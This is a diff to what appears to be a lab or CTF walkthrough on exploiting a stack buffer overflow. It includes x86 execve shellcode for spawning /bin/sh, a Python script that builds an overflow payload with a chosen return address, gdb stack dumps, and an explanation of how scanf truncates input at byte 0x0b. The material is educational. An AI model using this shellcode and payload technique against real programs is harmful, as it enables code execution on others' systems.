@@ -549,7 +549,7 @@ Disassembly of section .text:
 char shellcode[] = "\x31\xc0\x50\x68\x2f\x2f\x73"
                    "\x68\x68\x2f\x62\x69\x6e\x89"
                    "\xe3\x89\xc1\x89\xc2\xb0\x0b"
-                   "\xcd\x80\1bx31\xc0\x40\xcd\x80";
+                   "\xcd\x80\x31\xc0\x40\xcd\x80";
 
 int main()
 {
@@ -560,11 +560,10 @@ int main()
 
 Create the payload with a [python](exploit1.py) script. Note that `eip` is set to the return address of `0xffffdd6c + 4` as discovered earlier.
 ```python
-#!/usr/bin/python3
 import struct
 
 eip = struct.pack("I", 0xffffdd6c + 4)
-shellcode =  b'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\1bx31\xc0\x40\xcd\x80'
+shellcode = b'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80'
 payload = b'1 ' + b'A' * 1012 + b'BBBB' + eip + shellcode
 
 with open("payload", "wb") as handle:
@@ -581,7 +580,7 @@ Breakpoint 2, 0x08049276 in ?? ()
 0xffffdd6c:	0xffffdd70	0x6850c031
 ```
 
-This is good. The program is about to return to `0xffffdd70` (which is `0xffffdd6c + 4`) just as intended. However, continue the program and it segfaults. 
+This is good. The program is about to return to `0xffffdd70` (which is `0xffffdd6c + 4`) just as intended. However, continue the program and it segfaults. Why?
 
 Examine the stack and make sure everything else is in place. The return address is definitely correct:
 ```
@@ -591,28 +590,42 @@ Examine the stack and make sure everything else is in place. The return address 
 0xffffdd6c:	0xffffdd70  0x6850c031
 ```
 
-What about the payload? Compare the intended payload with the stack contents. At this point its easier to read the stack in byte sizes due to [endianness](https://en.wikipedia.org/wiki/Endianness). Use this command: `x/48bx $esp+4`. Here is the output with comparison to the payload:
+What about the payload? Compare the intended payload with the stack contents. It is easier to read the stack in byte sizes due to [endianness](https://en.wikipedia.org/wiki/Endianness). Use this command: `x/48bx $esp+4`. Here is the output with comparison to the payload:
 ```
 (gdb) x/48bx $esp+4
 intended payload address
 v
 0xffffdd70:	0x31	0xc0	0x50	0x68	0x2f	0x2f	0x73	0x68  # stack
             \x31    \xc0    \x50    \x68    \x2f    \x2f    \x73    \x68  # payload part 1
-
+            
 0xffffdd78:	0x68	0x2f	0x62	0x69	0x6e	0x89	0xe3	0x89  # stack
             \x68    \x2f    \x62    \x69    \x6e    \x89    \xe3    \x89  # payload part 2
 
 0xffffdd80:	0xc1	0x89	0xc2	0xb0	0x00	0xc0	0x04	0x08  # stack
-            \xc1    \x89    \xc2    \xb0    \x0b    \xcd    \x80    \1    # payload part 3
-                                            ^ starting from this byte, the payload does not match
+            \xc1    \x89    \xc2    \xb0    \x0b    \xcd    \x80    \x31  # payload part 3
+                                            ^ starting from this byte, the payload and stack do not match
+
 0xffffdd88:	0xa8	0xdd	0xff	0xff	0xb1	0x94	0x04	0x08  # stack
-            b       x       3       1       \xc0    \x40    \xcd    \x80  # payload part 4
+            \xc0    \x40    \xcd    \x80                                  # payload part 4
 ...
 ```
 
-Turns out that `scanf` stops scanning at `0x0b`, which is a vertical tab according to the [ascii table](http://www.asciitable.com/). Is it possible to get around this? Yes.
+Turns out that `scanf` stops scanning at `0x0b`, which is a vertical tab according to the [ascii table](http://www.asciitable.com/). What happens if this byte is removed? Try it. Remove byte `0x0b`, run the script again, and examine the stack. The stack and payload now match. Thus, only byte `0x0b` causes an issue. Is it possible to get around this? Yes.
 
+### Circumvent Scanf's `0x0b` Limitation
 
+The `scanf` function stops scanning at byte `0x0b` of the payload. Byte `0x0b` must be considered a terminating character according to `scanf`. Therefore, this byte must be removed. And the question becomes: how to deliver the same payload without byte `0x0b`?
+
+First examine what that byte is actually doing. From the shell code script it is doing this:
+```
+AT&T Assembly Syntax:
+8048073: b0 0b      mov    $0xb,%al
+
+Intel Assembly Syntax:
+8048073: b0 0b      mov    al,0xb
+```
+
+It is moving the hex value `0xb` into register `al`. 
 
 # TODO
 TODO: remove all /zionperez/ folder names
